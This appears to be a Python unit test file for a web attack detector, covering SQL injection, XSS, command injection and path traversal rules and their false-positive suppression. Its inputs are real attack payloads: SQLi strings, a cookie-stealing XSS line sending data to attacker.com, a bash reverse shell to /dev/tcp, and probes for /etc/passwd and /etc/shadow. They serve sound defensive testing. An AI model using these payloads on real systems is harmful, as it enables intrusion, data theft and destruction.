"""
Exhaustive unit tests for Advanced Multi-Tier Security Rules (Phase 3).
Tests SQLi, XSS, Command Injection, and Path Traversal across confidence levels
and verifies aggressive suppression of false positives.
"""

from app.detection.rules.base import RuleConfidence
from app.detection.rules.sqli import SQLInjectionRule
from app.detection.rules.xss import XSSRule
from app.detection.rules.command_injection import CommandInjectionRule
from app.detection.rules.path_traversal import PathTraversalRule


# ==============================================================================
# 1. SQL Injection Rule Tests
# ==============================================================================

def test_sqli_union_injection():
    rule = SQLInjectionRule()
    res = rule.analyze("1' UNION SELECT null, username, password FROM users--")
    assert res.matched is True
    assert res.category == "SQL_INJECTION"
    assert res.score >= 80
    assert res.confidence == RuleConfidence.HIGH_CONFIDENCE
    assert any("UNION" in ind for ind in res.indicators)


def test_sqli_boolean_tautologies():
    rule = SQLInjectionRule()
    # Numeric tautology
    res1 = rule.analyze("admin' OR 1=1--")
    assert res1.matched is True
    assert res1.score >= 85
    assert res1.confidence == RuleConfidence.HIGH_CONFIDENCE

    # String tautology
    res2 = rule.analyze("' OR 'a'='a'")
    assert res2.matched is True
    assert res2.score >= 85
    assert res2.confidence == RuleConfidence.HIGH_CONFIDENCE


def test_sqli_stacked_destructive_commands():
    rule = SQLInjectionRule()
    res = rule.analyze("105; DROP TABLE accounts;--")
    assert res.matched is True
    assert res.score >= 90
    assert res.confidence == RuleConfidence.HIGH_CONFIDENCE
    assert any("DROP/ALTER" in r for r in res.reason.split(";"))


def test_sqli_blind_time_delays():
    rule = SQLInjectionRule()
    # Postgres / MySQL sleep
    res1 = rule.analyze("id=1 AND SLEEP(5)")
    assert res1.matched is True
    assert res1.score >= 80

    # MSSQL WAITFOR DELAY
    res2 = rule.analyze("; WAITFOR DELAY '0:0:5'")
    assert res2.matched is True
    assert res2.score >= 90


def test_sqli_false_positive_suppression():
    rule = SQLInjectionRule()
    # Isolated English words should not trigger SQLi
    res1 = rule.analyze("Select a category in the European Union")
    assert res1.matched is False
    assert res1.score == 0
    assert res1.confidence == RuleConfidence.NO_EVIDENCE

    # Normal search for programming books
    res2 = rule.analyze("learn python and sql database basics")
    assert res2.matched is False
    assert res2.score == 0


# ==============================================================================
# 2. Cross-Site Scripting (XSS) Rule Tests
# ==============================================================================

def test_xss_script_tags():
    rule = XSSRule()
    res = rule.analyze("<script type='text/javascript'>alert(1)</script>")
    assert res.matched is True
    assert res.category == "CROSS_SITE_SCRIPTING"
    assert res.score >= 80
    assert res.confidence == RuleConfidence.HIGH_CONFIDENCE


def test_xss_event_handlers():
    rule = XSSRule()
    # Image error handler
    res1 = rule.analyze("<img src='nonexistent.jpg' onerror='alert(document.cookie)'>")
    assert res1.matched is True
    assert res1.score >= 85
    assert res1.confidence == RuleConfidence.HIGH_CONFIDENCE

    # SVG onload
    res2 = rule.analyze("<svg onload=alert(1)>")
    assert res2.matched is True
    assert res2.score >= 85


def test_xss_pseudo_protocols():
    rule = XSSRule()
    res = rule.analyze("<a href='javascript:alert(1)'>Click here</a>")
    assert res.matched is True
    assert res.score >= 85


def test_xss_dom_extraction():
    rule = XSSRule()
    res = rule.analyze("window.location='http://attacker.com/?steal=' + document.cookie")
    assert res.matched is True
    assert res.score >= 80


def test_xss_false_positive_suppression():
    rule = XSSRule()
    # Mathematical inequalities
    res1 = rule.analyze("if price < 100 and stock > 5")
    assert res1.matched is False
    assert res1.score == 0
    assert res1.confidence == RuleConfidence.NO_EVIDENCE

    # Benign English text mentioning scripts or alerts
    res2 = rule.analyze("The movie script had an alert scene in act 2")
    assert res2.matched is False
    assert res2.score == 0


# ==============================================================================
# 3. Command Injection (RCE) Rule Tests
# ==============================================================================

def test_command_injection_chaining():
    rule = CommandInjectionRule()
    # Semicolon chaining
    res1 = rule.analyze("127.0.0.1; whoami")
    assert res1.matched is True
    assert res1.category == "COMMAND_INJECTION"
    assert res1.score >= 90
    assert res1.confidence == RuleConfidence.HIGH_CONFIDENCE

    # Pipe chaining
    res2 = rule.analyze("test | cat /etc/passwd")
    assert res2.matched is True
    assert res2.score >= 90

    # Double AND operator
    res3 = rule.analyze("echo ok && id")
    assert res3.matched is True
    assert res3.score >= 90


def test_command_injection_substitutions():
    rule = CommandInjectionRule()
    # Subshell syntax
    res1 = rule.analyze("echo $(uname -a)")
    assert res1.matched is True
    assert res1.score >= 90

    # Backticks
    res2 = rule.analyze("ping `whoami`.attacker.com")
    assert res2.matched is True
    assert res2.score >= 90


def test_command_injection_reverse_shell_redirect():
    rule = CommandInjectionRule()
    res = rule.analyze("bash -i > /dev/tcp/10.0.0.1/4444 2>&1")
    assert res.matched is True
    assert res.score >= 95
    assert res.confidence == RuleConfidence.HIGH_CONFIDENCE


def test_command_injection_false_positive_suppression():
    rule = CommandInjectionRule()
    # Semicolon in normal punctuation
    res = rule.analyze("Meeting at 3pm; please bring the presentation slides.")
    assert res.matched is False
    assert res.score == 0
    assert res.confidence == RuleConfidence.NO_EVIDENCE


# ==============================================================================
# 4. Path Traversal Rule Tests
# ==============================================================================

def test_path_traversal_relative_sequences():
    rule = PathTraversalRule()
    # Standard dot-dot-slash
    res1 = rule.analyze("../../../../etc/passwd")
    assert res1.matched is True
    assert res1.category == "PATH_TRAVERSAL"
    assert res1.score >= 85
    assert res1.confidence == RuleConfidence.HIGH_CONFIDENCE

    # Multi-dot evasion (....//)
    res2 = rule.analyze("....//....//etc/passwd")
    assert res2.matched is True
    assert res2.score >= 85


def test_path_traversal_windows_paths():
    rule = PathTraversalRule()
    res = rule.analyze("..\\..\\windows\\win.ini")
    assert res.matched is True
    assert res.score >= 85
    assert res.confidence == RuleConfidence.HIGH_CONFIDENCE


def test_path_traversal_encoded_sequences():
    rule = PathTraversalRule()
    # URL encoded dot-dot-slash
    res = rule.analyze("%2e%2e%2f%2e%2e%2fetc/passwd")
    assert res.matched is True
    assert res.score >= 85


def test_path_traversal_sensitive_system_files():
    rule = PathTraversalRule()
    # Direct probe for sensitive system file
    res = rule.analyze("/var/log/../../etc/shadow")
    assert res.matched is True
    assert res.score >= 90


def test_path_traversal_false_positive_suppression():
    rule = PathTraversalRule()
    # Normal file names with extensions
    res1 = rule.analyze("quarterly_report_v2.0.pdf")
    assert res1.matched is False
    assert res1.score == 0

    # Normal dot in query string
    res2 = rule.analyze("item.id=123&version=1.0.0")
    assert res2.matched is False
    assert res2.score == 0
